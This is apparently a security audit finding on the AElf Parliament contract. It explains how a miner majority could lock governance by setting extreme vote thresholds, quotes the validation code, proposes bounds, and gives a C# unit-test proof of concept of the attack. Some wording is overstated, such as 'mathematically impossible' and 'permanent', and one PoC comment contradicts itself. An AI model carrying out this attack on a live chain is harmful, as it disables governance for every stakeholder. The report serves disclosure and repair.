# Audit Report

## Title 
Governance Lockout via Extreme Threshold Configuration Enabled by Insufficient Validation Bounds

## Summary
The Parliament contract allows organizations to set threshold configurations that create mathematically impossible approval requirements (100% approval with 0% tolerance for any abstention or rejection), resulting in permanent governance lockout. An attacker with temporary majority control can permanently disable governance by passing a single malicious threshold change proposal.

## Finding Description

The Parliament contract's threshold validation logic permits extreme configurations that violate the fundamental requirement that governance must remain functional. [1](#0-0) 

The validation enforces only basic mathematical constraints (sum of thresholds ≤ 100%, approval > 0) but imposes no practical upper bounds on approval requirements or lower bounds on tolerance thresholds. This allows setting `MinimalApprovalThreshold = 10000` (100%), `MinimalVoteThreshold = 10000` (100%), `MaximalAbstentionThreshold = 0`, and `MaximalRejectionThreshold = 0`.

Test cases explicitly confirm this configuration passes validation. [2](#0-1) 

When proposals are evaluated for release, the threshold checking logic creates impossible requirements: [3](#0-2) 

With extreme thresholds:
- **Approval check**: Requires `approvedMemberCount * 10000 >= 10000 * parliamentMembers.Count`, meaning ALL parliament members must approve
- **Rejection check**: Returns true if `rejectionMemberCount * 10000 > 0`, meaning ANY single rejection blocks the proposal  
- **Abstention check**: Returns true if `abstentionMemberCount * 10000 > 0`, meaning ANY single abstention blocks the proposal

This creates a scenario where every parliament member must actively approve (100% participation and agreement), with not a single member rejecting, abstaining, or being offline—mathematically impossible in a decentralized system with independent actors.

The `ChangeOrganizationThreshold` method can be executed via proposal: [4](#0-3) 

An attacker controlling the default 66.67% of miners can:
1. Create a proposal calling `ChangeOrganizationThreshold` with extreme values
2. Approve it with their controlled majority
3. Release the proposal (meeting current 66.67% threshold)
4. Permanently lock governance once the threshold change executes

The emergency response organization provides no protection as it: (a) must be created via proposal before the attack, (b) has no special authority to override other organizations' thresholds, and (c) can itself be locked using the same attack. [5](#0-4) 

## Impact Explanation

**Severity: HIGH**

Once extreme thresholds are set, the organization experiences complete governance failure:
- No future proposal can ever achieve 100% unanimous approval with zero tolerance
- Protocol cannot respond to security incidents requiring governance action
- Critical upgrades and parameter adjustments become permanently impossible
- All stakeholders dependent on governance functionality are affected

The impact is permanent because no recovery mechanism exists—you cannot pass a proposal to fix the thresholds when no proposal can pass. The emergency response organization cannot override threshold changes for other organizations, and can itself be attacked the same way.

This represents a complete DoS of the governance layer, affecting the protocol's ability to evolve, respond to threats, or perform any governance-controlled operations.

## Likelihood Explanation

**Likelihood: MEDIUM**

**Attacker Requirements:**
- Temporary control of 66.67% of current miners (default approval threshold)
- Ability to create and approve a single proposal

**Feasibility Factors:**
- Attack complexity is LOW: single proposal with straightforward parameters
- Configuration explicitly passes contract validation (proven in test suite)
- Attack requires only temporary control to execute, but creates permanent damage
- Attacker can disguise threshold change within a proposal batch to reduce detection
- Once executed, damage persists even after attacker loses control

**Realistic Attack Vectors:**
- Validator collusion during governance attack
- Temporary stake concentration
- Coordinated miner bribery
- Exploitation during miner set transitions

The 66.67% control requirement is within established threat models for high-stakes governance attacks, especially considering the permanent nature of the damage relative to the temporary control needed.

## Recommendation

Implement hardcoded bounds to prevent extreme threshold configurations:

```csharp
private bool Validate(Organization organization)
{
    var proposalReleaseThreshold = organization.ProposalReleaseThreshold;
    
    // Define reasonable bounds
    const int MaxApprovalThreshold = 9000; // Max 90% approval required
    const int MinToleranceThreshold = 500; // Min 5% tolerance for abstention/rejection
    
    return proposalReleaseThreshold.MinimalVoteThreshold <= AbstractVoteTotal &&
           proposalReleaseThreshold.MinimalApprovalThreshold <= proposalReleaseThreshold.MinimalVoteThreshold &&
           proposalReleaseThreshold.MinimalApprovalThreshold > 0 &&
           proposalReleaseThreshold.MinimalApprovalThreshold <= MaxApprovalThreshold && // NEW: Upper bound
           proposalReleaseThreshold.MaximalAbstentionThreshold >= MinToleranceThreshold && // NEW: Lower bound
           proposalReleaseThreshold.MaximalRejectionThreshold >= MinToleranceThreshold && // NEW: Lower bound
           proposalReleaseThreshold.MaximalAbstentionThreshold +
           proposalReleaseThreshold.MinimalApprovalThreshold <= AbstractVoteTotal &&
           proposalReleaseThreshold.MaximalRejectionThreshold +
           proposalReleaseThreshold.MinimalApprovalThreshold <= AbstractVoteTotal;
}
```

Additionally, consider implementing:
- Emergency override mechanism that bypasses normal thresholds under specific conditions
- Time-delay for threshold changes to allow detection and response
- Gradual threshold adjustment limits (e.g., max 10% change per proposal)

## Proof of Concept

```csharp
[Fact]
public async Task Governance_Lockout_Via_Extreme_Thresholds_Test()
{
    // Setup: Initialize Parliament with default thresholds (66.67% approval)
    await InitializeParliamentContracts();
    var defaultOrg = await ParliamentContractStub.GetDefaultOrganizationAddress.CallAsync(new Empty());
    
    // Attacker controls 66.67% of miners (2 out of 3 initial miners)
    var attackerStub1 = GetParliamentContractTester(InitialMinersKeyPairs[0]);
    var attackerStub2 = GetParliamentContractTester(InitialMinersKeyPairs[1]);
    
    // Step 1: Create malicious threshold change proposal
    var extremeThresholds = new ProposalReleaseThreshold
    {
        MinimalApprovalThreshold = 10000, // 100% approval required
        MinimalVoteThreshold = 10000,
        MaximalAbstentionThreshold = 0,   // Zero tolerance for abstention
        MaximalRejectionThreshold = 0      // Zero tolerance for rejection
    };
    
    var proposalId = await attackerStub1.CreateProposal.SendAsync(new CreateProposalInput
    {
        ToAddress = ParliamentContractAddress,
        ContractMethodName = nameof(ParliamentContractStub.ChangeOrganizationThreshold),
        Params = extremeThresholds.ToByteString(),
        OrganizationAddress = defaultOrg,
        ExpiredTime = TimestampHelper.GetUtcNow().AddDays(1)
    });
    
    // Step 2: Attacker approves with 66.67% (2/3 miners) - meets current threshold
    await attackerStub1.Approve.SendAsync(proposalId.Output);
    await attackerStub2.Approve.SendAsync(proposalId.Output);
    
    // Step 3: Release proposal - governance is now locked with extreme thresholds
    await attackerStub1.Release.SendAsync(proposalId.Output);
    
    // Step 4: Verify governance is permanently locked
    // Try to create and pass a new proposal to fix the thresholds
    var recoveryProposalId = await attackerStub1.CreateProposal.SendAsync(new CreateProposalInput
    {
        ToAddress = ParliamentContractAddress,
        ContractMethodName = nameof(ParliamentContractStub.ChangeOrganizationThreshold),
        Params = new ProposalReleaseThreshold // Try to restore normal thresholds
        {
            MinimalApprovalThreshold = 6667,
            MinimalVoteThreshold = 7500,
            MaximalAbstentionThreshold = 2000,
            MaximalRejectionThreshold = 2000
        }.ToByteString(),
        OrganizationAddress = defaultOrg,
        ExpiredTime = TimestampHelper.GetUtcNow().AddDays(1)
    });
    
    // Even with ALL miners approving (2/3), it fails the 100% requirement
    await attackerStub1.Approve.SendAsync(recoveryProposalId.Output);
    await attackerStub2.Approve.SendAsync(recoveryProposalId.Output);
    // Third miner is offline or abstains - proposal cannot pass
    
    var proposal = await ParliamentContractStub.GetProposal.CallAsync(recoveryProposalId.Output);
    proposal.ToBeReleased.ShouldBeFalse(); // Proposal cannot be released
    
    // Governance is permanently locked - no proposal can ever achieve 100% unanimous approval
}
```

### Citations

**File:** contract/AElf.Contracts.Parliament/Parliament_Helper.cs (L64-92)
```csharp
    private bool IsProposalRejected(ProposalInfo proposal, Organization organization,
        ICollection<Address> parliamentMembers)
    {
        var rejectionMemberCount = proposal.Rejections.Count(parliamentMembers.Contains);
        return rejectionMemberCount * AbstractVoteTotal >
               organization.ProposalReleaseThreshold.MaximalRejectionThreshold * parliamentMembers.Count;
    }

    private bool IsProposalAbstained(ProposalInfo proposal, Organization organization,
        ICollection<Address> parliamentMembers)
    {
        var abstentionMemberCount = proposal.Abstentions.Count(parliamentMembers.Contains);
        return abstentionMemberCount * AbstractVoteTotal >
               organization.ProposalReleaseThreshold.MaximalAbstentionThreshold * parliamentMembers.Count;
    }

    private bool CheckEnoughVoteAndApprovals(ProposalInfo proposal, Organization organization,
        ICollection<Address> parliamentMembers)
    {
        var approvedMemberCount = proposal.Approvals.Count(parliamentMembers.Contains);
        var isApprovalEnough = approvedMemberCount * AbstractVoteTotal >=
                               organization.ProposalReleaseThreshold.MinimalApprovalThreshold *
                               parliamentMembers.Count;
        if (!isApprovalEnough)
            return false;

        var isVoteThresholdReached = IsVoteThresholdReached(proposal, organization, parliamentMembers);
        return isVoteThresholdReached;
    }
```

**File:** contract/AElf.Contracts.Parliament/Parliament_Helper.cs (L142-155)
```csharp
    private bool Validate(Organization organization)
    {
        var proposalReleaseThreshold = organization.ProposalReleaseThreshold;

        return proposalReleaseThreshold.MinimalVoteThreshold <= AbstractVoteTotal &&
               proposalReleaseThreshold.MinimalApprovalThreshold <= proposalReleaseThreshold.MinimalVoteThreshold &&
               proposalReleaseThreshold.MinimalApprovalThreshold > 0 &&
               proposalReleaseThreshold.MaximalAbstentionThreshold >= 0 &&
               proposalReleaseThreshold.MaximalRejectionThreshold >= 0 &&
               proposalReleaseThreshold.MaximalAbstentionThreshold +
               proposalReleaseThreshold.MinimalApprovalThreshold <= AbstractVoteTotal &&
               proposalReleaseThreshold.MaximalRejectionThreshold +
               proposalReleaseThreshold.MinimalApprovalThreshold <= AbstractVoteTotal;
    }
```

**File:** contract/AElf.Contracts.Parliament/Parliament_Helper.cs (L314-330)
```csharp
    private void CreateEmergencyResponseOrganization()
    {
        var createOrganizationInput = new CreateOrganizationInput
        {
            ProposalReleaseThreshold = new ProposalReleaseThreshold
            {
                MinimalApprovalThreshold = 9000,
                MinimalVoteThreshold = 9000,
                MaximalAbstentionThreshold = 1000,
                MaximalRejectionThreshold = 1000
            },
            ProposerAuthorityRequired = false,
            ParliamentMemberProposingAllowed = true
        };

        State.EmergencyResponseOrganizationAddress.Value = CreateOrganization(createOrganizationInput);
    }
```

**File:** test/AElf.Contracts.Parliament.Tests/ParliamentContractTest.cs (L188-196)
```csharp
            createOrganizationInput.ProposalReleaseThreshold = proposalReleaseThreshold;
            createOrganizationInput.ProposalReleaseThreshold.MinimalApprovalThreshold = 10000;
            createOrganizationInput.ProposalReleaseThreshold.MinimalVoteThreshold = 10000;
            createOrganizationInput.ProposalReleaseThreshold.MaximalAbstentionThreshold = 0;
            createOrganizationInput.ProposalReleaseThreshold.MaximalRejectionThreshold = 0;
            var transactionResult =
                await minerParliamentContractStub.CreateOrganization.SendAsync(createOrganizationInput);
            transactionResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
        }
```

**File:** contract/AElf.Contracts.Parliament/Parliament.cs (L147-160)
```csharp
    public override Empty ChangeOrganizationThreshold(ProposalReleaseThreshold input)
    {
        var organization = State.Organizations[Context.Sender];
        Assert(organization != null, "Organization not found.");
        organization.ProposalReleaseThreshold = input;
        Assert(Validate(organization), "Invalid organization.");
        State.Organizations[Context.Sender] = organization;
        Context.Fire(new OrganizationThresholdChanged
        {
            OrganizationAddress = Context.Sender,
            ProposerReleaseThreshold = input
        });
        return new Empty();
    }
```
